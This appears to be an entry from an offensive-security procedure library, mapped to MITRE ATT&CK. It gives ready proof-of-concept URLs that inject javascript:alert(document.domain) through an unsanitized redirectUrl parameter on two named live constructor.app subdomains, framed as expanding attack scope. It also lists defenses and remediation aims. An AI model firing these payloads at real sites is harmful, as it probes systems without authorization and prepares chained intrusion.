---
tags:
  - xss
  - domain-expansion
  - vulnerability-scanning
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/alert-document-domain]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 2fc5feaa-7534-4ca4-869f-517dda1f3e8e
created_at: '2025-12-13T23:55:06.830Z'
updated_at: '2025-12-13T23:55:06.830Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Similar-Vulnerabilities-in-Related-Domains

## Summary

This procedure tests the XSS payload on affiliated domains like constructor.app portals to identify broader exploitation opportunities.

## Description

The same unsanitized redirectUrl affects related services. Reuse domain-alert payload to confirm. Use case: Expand attack scope. Target: web.constructor.app and bloomberg401k.constructor.app. Outcomes: Multiple vuln confirmations for chained attacks.

## Requirements

1. List of related domains
2. Basic payload from prior steps
3. Access to test logins

## Defense

Defensive measures and detection strategies:

- Centralized input validation across subdomains
- Audit shared codebases for redirect flaws
- Use automated scanners for XSS in portals

## Objectives

1. Verify vuln in additional endpoints
2. Map attack surface
3. Prioritize remediation

## Instructions

### Step 1: Target First Related Domain

**Context**: Apply payload to constructor.app.

**Command** ([[commands/alert-domain-document]]):

```url
https://web.constructor.app/portal/login-callback?redirectUrl=javascript:alert(document.domain)
```

> Test login. Expected: Alert with domain.

### Step 2: Target Second Domain

**Context**: Repeat for bloomberg variant.

**Command** ([[commands/alert-document-domain]]):

```url
https://bloomberg401k.constructor.app/portal/login-callback?redirectUrl=javascript:alert(document.domain)
```

> Observe execution. Success: Cross-domain confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/alert-document-domain]]

## Tools Used


## Tags

- [[xss]]
- [[domain-expansion]]
